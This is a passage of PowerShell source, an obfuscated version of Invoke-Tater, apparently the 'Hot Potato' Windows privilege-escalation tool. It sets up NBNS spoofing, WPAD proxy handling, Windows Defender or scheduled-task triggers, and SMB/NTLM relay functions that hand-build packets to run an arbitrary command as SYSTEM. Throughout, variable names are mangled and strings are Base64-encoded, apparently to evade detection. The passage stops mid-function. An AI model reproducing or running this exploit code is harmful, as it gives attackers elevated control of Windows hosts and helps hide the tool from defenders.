function Invoke-Tater
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSLimit="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ExhaustUDP="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$TaskDelete="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool="0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_ })][String]$IP="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_ })][String]$SpooferIP="127.0.0.1",
    [parameter(Mandatory=$false)][Int]$HTTPPort="80",
    [parameter(Mandatory=$false)][Int]$RunTime="",
    [parameter(Mandatory=$false)][ValidateSet(0,1,2)][Int]$Trigger="1",
    [parameter(Mandatory=$true)][String]$Command="",
    [parameter(Mandatory=$false)][String]$Hostname="WPAD",  
    [parameter(Mandatory=$false)][String]$Taskname="Tater",
    [parameter(Mandatory=$false)][String]$WPADPort="80",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)
if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}
if(!$IP)
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}
if(!$Command)
{
    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0AQwBvAG0AbQBhAG4AZAAgAGkAZgAgAGUAbgBhAGIAbABpAG4AZwAgAC0AUwBNAEIAUgBlAGwAYQB5AA==')))
}
if(${__/\__/\/=\___/==}.running)
{
    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBUAGEAdABlAHIAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAcgB1AG4AbgBpAG4AZwAsACAAdQBzAGUAIABTAHQAbwBwAC0AVABhAHQAZQByAA==')))
}
${global:__/\__/\/=\___/==} = [HashTable]::Synchronized(@{})
${__/\__/\/=\___/==}.running = $true
${__/\__/\/=\___/==}.console_queue = New-Object System.Collections.ArrayList
${__/\__/\/=\___/==}.status_queue = New-Object System.Collections.ArrayList
${__/\__/\/=\___/==}.console_input = $true
${__/\__/\/=\___/==}.SMB_relay_active_step = 0
${__/\__/\/=\___/==}.trigger = $Trigger
if($StatusOutput -eq 'Y')
{
    ${__/\__/\/=\___/==}.status_output = $true
}
else
{
    ${__/\__/\/=\___/==}.status_output = $false
}
if($Tool -eq 1) 
{
    ${__/\__/\/=\___/==}.tool = 1
    ${__/\__/\/=\___/==}.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) 
{
    ${__/\__/\/=\___/==}.tool = 2
    ${__/\__/\/=\___/==}.console_input = $false
    ${__/\__/\/=\___/==}.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    ${__/\__/\/=\___/==}.tool = 0
    ${__/\__/\/=\___/==}.newline = ""
}
if($Trigger -eq 2)
{
    $NBNS = 'N'
}
${__/\__/\/=\___/==}.status_queue.Add("$(Get-Date -format 's') - Tater (Hot Potato Privilege Escalation) started") > $null
${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAASQBQACAAQQBkAGQAcgBlAHMAcwAgAD0AIAAkAEkAUAA=')))) > $null
if($HTTPPort -ne 80)
{
    ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAFAAbwByAHQAIAA9ACAAJABIAFQAVABQAFAAbwByAHQA')))) > $null
}
if($NBNS -eq 'Y')
{
    ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG8AbwBmAGkAbgBnACAASABvAHMAdABuAGEAbQBlACAAPQAgACQASABvAHMAdABuAGEAbQBlAA==')))) > $null
    if($NBNSLimit -eq 'N')
    {
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAEIAcgB1AHQAZQBmAG8AcgBjAGUAIABTAHAAbwBvAGYAZQByACAATABpAG0AaQB0AGkAbgBnACAARABpAHMAYQBiAGwAZQBkAA==')))) > $null
    }
}
else
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAEIAcgB1AHQAZQBmAG8AcgBjAGUAIABTAHAAbwBvAGYAaQBuAGcAIABEAGkAcwBhAGIAbABlAGQA')))) > $null
}
if($SpooferIP -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA'))))
{
    ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAFMAcABvAG8AZgBlAHIAIABJAFAAIABBAGQAZAByAGUAcwBzACAAPQAgACQAUwBwAG8AbwBmAGUAcgBJAFAA')))) > $null
}
if($WPADDirectHosts.Count -gt 0)
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAEQAaQByAGUAYwB0ACAASABvAHMAdABzACAAPQAgAA=='))) + $WPADDirectHosts -join ",") > $null
}
if($WPADPort -ne 80)
{
    ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAFAAbwByAHQAIAA9ACAAJABXAFAAQQBEAFAAbwByAHQA')))) > $null
}
if($ExhaustUDP -eq 'Y')
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBEAFAAIABQAG8AcgB0ACAARQB4AGgAYQB1AHMAdABpAG8AbgAgAEUAbgBhAGIAbABlAGQA')))) > $null
}
if($Trigger -eq 0)
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGwAYQB5ACAAVAByAGkAZwBnAGUAcgAgAEQAaQBzAGEAYgBsAGUAZAA=')))) > $null
}
elseif($Trigger -eq 1)
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAFQAcgBpAGcAZwBlAHIAIABFAG4AYQBiAGwAZQBkAA==')))) > $null
}
elseif($Trigger -eq 2)
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAAVAByAGkAZwBnAGUAcgAgAEUAbgBhAGIAbABlAGQA')))) > $null
    ${__/\__/\/=\___/==}.taskname = $Taskname -replace " ","_"
    if($TaskDelete -eq 'Y')
    {
        ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAAUAByAGUAZgBpAHgAIAA9ACAAJABUAGEAcwBrAG4AYQBtAGUA')))) > $null
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAARABlAGwAZQB0AGkAbwBuACAARQBuAGEAYgBsAGUAZAA=')))) > $null
        ${__/\__/\/=\___/==}.task_delete = $true
    }
    else
    {
        ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAAPQAgACQAVABhAHMAawBuAGEAbQBlAA==')))) > $null
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAARABlAGwAZQB0AGkAbwBuACAARABpAHMAYQBiAGwAZQBkAA==')))) > $null
        ${__/\__/\/=\___/==}.task_delete = $false
    }
}
if($ConsoleOutput -eq 'Y')
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA==')))) > $null
    ${__/\__/\/=\___/==}.console_output = $true
}
else
{
    if(${__/\__/\/=\___/==}.tool -eq 1)
    {
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEUAeAB0AGUAcgBuAGEAbAAgAFQAbwBvAGwAIABTAGUAbABlAGMAdABpAG8AbgA=')))) > $null
    }
    else
    {
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA')))) > $null
    }
}
if($RunTime -eq '1')
{
    ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABUAGkAbQBlACAAPQAgACQAUgB1AG4AVABpAG0AZQAgAE0AaQBuAHUAdABlAA==')))) > $null
}
elseif($RunTime -gt 1)
{
    ${__/\__/\/=\___/==}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABUAGkAbQBlACAAPQAgACQAUgB1AG4AVABpAG0AZQAgAE0AaQBuAHUAdABlAHMA')))) > $null
}
if($ShowHelp -eq 'Y')
{
    ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0AVABhAHQAZQByACAAdABvACAAcwB0AG8AcAAgAFQAYQB0AGUAcgAgAGUAYQByAGwAeQA=')))) > $null
    if(${__/\__/\/=\___/==}.console_output)
    {
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAtAE4AbwB1AG4AIABUAGEAdABlAHIAKgAgAHQAbwAgAHMAaABvAHcAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGYAdQBuAGMAdABpAG8AbgBzAA==')))) > $null
        ${__/\__/\/=\___/==}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))) > $null
        ${__/\__/\/=\___/==}.status_queue.Add("") > $null
    }
}
if(${__/\__/\/=\___/==}.status_output)
{
    while(${__/\__/\/=\___/==}.status_queue.Count -gt 0)
    {
        write-output(${__/\__/\/=\___/==}.status_queue[0] + ${__/\__/\/=\___/==}.newline)
        ${__/\__/\/=\___/==}.status_queue.RemoveRange(0,1)
    }
}
${___/\/=\____/====} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
${___/\/=\____/====} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${___/\/=\____/====}))
${___/\/=\____/====} = ${___/\/=\____/====} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
[Byte[]] ${__/\__/\/=\___/==}.process_ID_bytes = ${___/\/=\____/====}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
${_/=\_______/==\/=} =
{
    function __/\_/\/\/===\/\_/
    {
        param ([Int]${_/==\__/======\__/},[Byte[]]${__/=\/\/=\_/=\_/\_})
        ${_/==\/\_/=\/\/\/\_} = [System.BitConverter]::ToInt16(${__/=\/\/=\_/=\_/\_}[${_/==\__/======\__/}..(${_/==\__/======\__/} + 1)],0)
        return ${_/==\/\_/=\/\/\/\_}
    }
    function _/=====\__/\_/==\/
    {
        param ([Int]${_/==\/\_/=\/\/\/\_},[Int]${__/\_/====\/=\__/=},[Int]${_/==\/====\/===\__},[Int]${__/===\/\___/=\/==},[Byte[]]${__/=\/\/=\_/=\_/\_})
        ${/=\__/\/\/=\___/\} = [System.BitConverter]::ToString(${__/=\/\/=\_/=\_/\_}[(${__/===\/\___/=\/==} + ${__/\_/====\/=\__/=} + ${_/==\/====\/===\__})..(${__/===\/\___/=\/==} + ${_/==\/\_/=\/\/\/\_} + ${__/\_/====\/=\__/=} + ${_/==\/====\/===\__} - 1)])
        ${/=\__/\/\/=\___/\} = ${/=\__/\/\/=\___/\} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${/=\__/\/\/=\___/\} = ${/=\__/\/\/=\___/\}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${___/==\/==\__/\/\} = New-Object System.String (${/=\__/\/\/=\___/\},0,${/=\__/\/\/=\___/\}.Length)
        return ${___/==\/==\__/\/\}
    }
    function ___/===\/==\_/====
    {
        ${/====\/\/\/\/\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAZABuAHMAYQBwAGkALgBkAGwAbAAiACwAIABFAG4AdAByAHkAUABvAGkAbgB0AD0AIgBEAG4AcwBGAGwAdQBzAGgAUgBlAHMAbwBsAHYAZQByAEMAYQBjAGgAZQAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABVAEkAbgB0ADMAMgAgAEQAbgBzAEYAbAB1AHMAaABSAGUAcwBvAGwAdgBlAHIAQwBhAGMAaABlACgAKQA7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAHYAbwBpAGQAIABGAGwAdQBzAGgAUgBlAHMAbwBsAHYAZQByAEMAYQBjAGgAZQAoACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVQBJAG4AdAAzADIAIAByAGUAcwB1AGwAdAAgAD0AIABEAG4AcwBGAGwAdQBzAGgAUgBlAHMAbwBsAHYAZQByAEMAYQBjAGgAZQAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQA=')))
        Add-Type -MemberDefinition ${/====\/\/\/\/\/\/} -Namespace DNSAPI -Name Flush -UsingNamespace System.Collections,System.ComponentModel
        [DNSAPI.Flush]::FlushResolverCache()
    }
    function ___/====\/\/\_/=\/
    {
        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Stopping HTTP listener")
        ${__/\__/\/=\___/==}.HTTP_client.Close()
        start-sleep -s 1
        ${__/\__/\/=\___/==}.HTTP_listener.server.blocking = $false
        sleep -s 1
        ${__/\__/\/=\___/==}.HTTP_listener.server.Close()
        sleep -s 1
        ${__/\__/\/=\___/==}.HTTP_listener.Stop()
        if(${__/\__/\/=\___/==}.SMBRelay_success)
        {
            if(${__/\__/\/=\___/==}.trigger -eq 2)
            {
                if(${__/\__/\/=\___/==}.task_delete -and ${__/\__/\/=\___/==}.task_added)
                {
                    ${/===\_/===\/\_/==} = $false
                    ${_/\_____/\/\____/} = new-object -com($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA='))))
                    ${_/\_____/\/\____/}.Connect()
                    ${___/\/\___/=\_/=\} = ${_/\_____/\/\____/}.GetFolder("\")
                    ${/=======\___/\/==} = ${___/\/\___/=\_/=\}.GetTasks(1)
                    foreach(${/=\_/\/==\/==\__/} in ${/=======\___/\/==})
                    {
                        if(${/=\_/\/==\/==\__/}.name -eq ${__/\__/\/=\___/==}.task)
                        {
                            ${___/\/\___/=\_/=\}.DeleteTask(${/=\_/\/==\/==\__/}.name,0)
                        }
                    }
                    foreach(${/=\_/\/==\/==\__/} in ${/=======\___/\/==})
                    {
                        if(${/=\_/\/==\/==\__/}.name -eq ${__/\__/\/=\___/==}.task)
                        {
                            ${/===\_/===\/\_/==} = $true
                        }
                    }
                    if(${/===\_/===\/\_/==})
                    {
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkA')))) 
                    }
                    else
                    {
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAsACAAcgBlAG0AbwB2AGUAIABtAGEAbgB1AGEAbABsAHkA'))))
                    }
                }
                elseif(${__/\__/\/=\___/==}.task_added)
                {
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Remove scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABtAGEAbgB1AGEAbABsAHkAIAB3AGgAZQBuACAAZgBpAG4AaQBzAGgAZQBkAA=='))))
                }
            }
        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Tater was successful and has exited")
        }
        else
        {
            ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Tater was not successful and has exited")
        }
        sleep -s 1 
        ${__/\__/\/=\___/==}.running = $false
    }
}
${__/====\/=\___/\_} =
{
    function __/=======\_/====\
    {
        param ([Byte[]]${___/\__/=\/=\/\_/\})
        ${__/\/=\_/\_/\__/=} = [System.BitConverter]::ToString(${___/\__/=\/=\/\_/\})
        ${__/\/=\_/\_/\__/=} = ${__/\/=\_/\_/\__/=} -replace "-",""
        ${__/\___/==\__/\__} = ${__/\/=\_/\_/\__/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        if(${__/\/=\_/\_/\__/=}.SubString((${__/\___/==\__/\__} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyADAAMAAwADAAMAAwAA=='))))
        {
            ${/==\_/==\_/\__/\/} = ${__/\/=\_/\_/\__/=}.SubString((${__/\___/==\__/\__} + 48),16)
        }
        return ${/==\_/==\_/\__/\/}
    }
}
${__/=\/\/====\__/=} =
{
    function _/=\__/\_/=\/==\/\
    {
        param (${_/===\___/=\/\_/==},${_/==\___/\/\_____/})
        if (${_/===\___/=\/\_/==})
        {
            ${_/\/=\/\/\/\_____} = ${_/===\___/=\/\_/==}.GetStream()
        }
        ${__/\/=\/\/=\/=\/\} = New-Object System.Byte[] 1024
        ${/==\__/\__/=\/=\/} = 0
        :SMB_relay_challenge_loop while (${/==\__/\__/=\/=\/} -lt 2)
        {
            switch (${/==\__/\__/=\/=\/})
            {
                0
                {
                    ${__/\__/=\_/\/\___} = 0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,
                                                0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0xff,0xff +
                                                ${__/\__/\/=\___/==}.process_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,
                                                0x20,0x30,0x2e,0x31,0x32,0x00
                }
                1
                { 
                    ${/====\__/\___/=\/} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/==\___/\/\_____/}.Length))
                    ${/====\__/\___/=\/} = ${/====\__/\___/=\/} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${/====\__/\___/=\/} = ${/====\__/\___/=\/}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                    ${_/==\_/=\____/=\/} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/==\___/\/\_____/}.Length + 28))
                    ${_/==\_/=\____/=\/} = ${_/==\_/=\____/=\/} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${_/==\_/=\____/=\/} = ${_/==\_/=\____/=\/}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                    ${_/\____/=\___/==\} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/==\___/\/\_____/}.Length + 87))
                    ${_/\____/=\___/==\} = ${_/\____/=\___/==\} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${_/\____/=\___/==\} = ${_/\____/=\___/==\}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                    [Array]::Reverse(${_/\____/=\___/==\})
                    ${__/\__/=\_/\/\___} = 0x00,0x00 +
                                                ${_/\____/=\___/==\} +
                                                0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                                ${__/\__/\/=\___/==}.process_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,
                                                0x01,0x00,0x00,0x00,0x00,0x00 +
                                                ${/====\__/\___/=\/} +
                                                0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                                ${_/==\_/=\____/=\/} +
                                                ${_/==\___/\/\_____/} +
                                                0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,
                                                0x00,0x00,0x00,0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,
                                                0x00,0x00
                }
            }
            ${_/\/=\/\/\/\_____}.Write(${__/\__/=\_/\/\___},0,${__/\__/=\_/\/\___}.Length)
            ${_/\/=\/\/\/\_____}.Flush()
            ${_/\/=\/\/\/\_____}.Read(${__/\/=\/\/=\/=\/\},0,${__/\/=\/\/=\/=\/\}.Length)
            ${/==\__/\__/=\/=\/}++
        }
        return ${__/\/=\/\/=\/=\/\}
    }
}
${__/===\__/=\_/==\} =
{
    function ____/==\/\_/=\/=\_
    {
        param (${_/===\___/=\/\_/==},${_/==\___/\/\_____/},${___/\/=\/==\__/\_/})
        ${/=\_____/==\/\__/} = New-Object System.Byte[] 1024
        if (${_/===\___/=\/\_/==})
        {
            ${__/\/\/\/==\__/=\} = ${_/===\___/=\/\_/==}.GetStream()
        }
        ${/====\__/\___/=\/} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/==\___/\/\_____/}.Length))
        ${/====\__/\___/=\/} = ${/====\__/\___/=\/} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${/====\__/\___/=\/} = ${/====\__/\___/=\/}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${_/==\_/=\____/=\/} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/==\___/\/\_____/}.Length + 28))
        ${_/==\_/=\____/=\/} = ${_/==\_/=\____/=\/} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${_/==\_/=\____/=\/} = ${_/==\_/=\____/=\/}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${_/\____/=\___/==\} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/==\___/\/\_____/}.Length + 88))
        ${_/\____/=\___/==\} = ${_/\____/=\___/==\} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${_/\____/=\___/==\} = ${_/\____/=\___/==\}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        [Array]::Reverse(${_/\____/=\___/==\})
        ${_/==\/\/\__/=\___} = 0
        :SMB_relay_response_loop while (${_/==\/\/\__/=\___} -lt 1)
        {
            ${__/=\_/==\__/==\/} = 0x00,0x00 +
                                       ${_/\____/=\___/==\} +
                                       0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,0x00,
                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                       ${__/\__/\/=\___/==}.process_ID_bytes +
                                       ${___/\/=\/==\__/\_/} +
                                       0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,
                                       0x00,0x00,0x00 +
                                       ${/====\__/\___/=\/} +
                                       0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                       ${_/==\_/=\____/=\/} +
                                       ${_/==\___/\/\_____/} +
                                       0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,
                                       0x00,0x00,0x00,0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,0x00,
                                       0x00
            ${__/\/\/\/==\__/=\}.Write(${__/=\_/==\__/==\/},0,${__/=\_/==\__/==\/}.Length)
        	${__/\/\/\/==\__/=\}.Flush()
            ${__/\/\/\/==\__/=\}.Read(${/=\_____/==\/\__/},0,${/=\_____/==\/\__/}.Length)
            ${__/\__/\/=\___/==}.SMB_relay_active_step = 2
            ${_/==\/\/\__/=\___}++
        }
        return ${/=\_____/==\/\__/}
    }
}
${_/=\/=\/\__/\_/\_} =
{
    function ___/\__/=\/=\/====
    {
        param (${_/===\___/=\/\_/==},${___/\/=\/==\__/\_/})
        if (${_/===\___/=\/\_/==})
        {
            ${/=====\__/==\_/\_} = ${_/===\___/=\/\_/==}.GetStream()
        }
        ${__/\/===\_____/\_} = $false
        ${__/=\____/\_/===\} = New-Object System.Byte[] 1024
        ${__/=\___/\_/\__/\} = [String]::Join($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0A'))), (1..20 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQA='))) -f (Get-Random -Minimum 65 -Maximum 90)}))
        ${__/====\/==\__/\/} = ${__/=\___/\_/\__/\} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${__/====\/==\__/\/} = ${__/====\/==\__/\/}.Substring(0,${__/====\/==\__/\/}.Length-1)
        ${__/====\/==\__/\/} = ${__/====\/==\__/\/}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${__/====\/==\__/\/} = New-Object System.String (${__/====\/==\__/\/},0,${__/====\/==\__/\/}.Length)
        ${__/=\___/\_/\__/\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAA==')))
        [Byte[]] ${_/\_/\____/\/=\__} = ${__/=\___/\_/\__/\}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${/====\/=\/==\/==\} = [String](1..4 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${/====\/=\/==\/==\} = ${/====\/=\/==\/==\}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        $Command = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBDAE8ATQBTAFAARQBDACUAIAAvAEMAIAAiAA=='))) + $Command + "`""
        [System.Text.Encoding]::UTF8.GetBytes($Command) | %{ ${_/\/=\/=\_/\/\__/} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQAwADAALQA='))) -f $_ }
        if([Bool]($Command.Length % 2))
        {
            ${_/\/=\/=\_/\/\__/} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAA==')))
        }
        else
        {
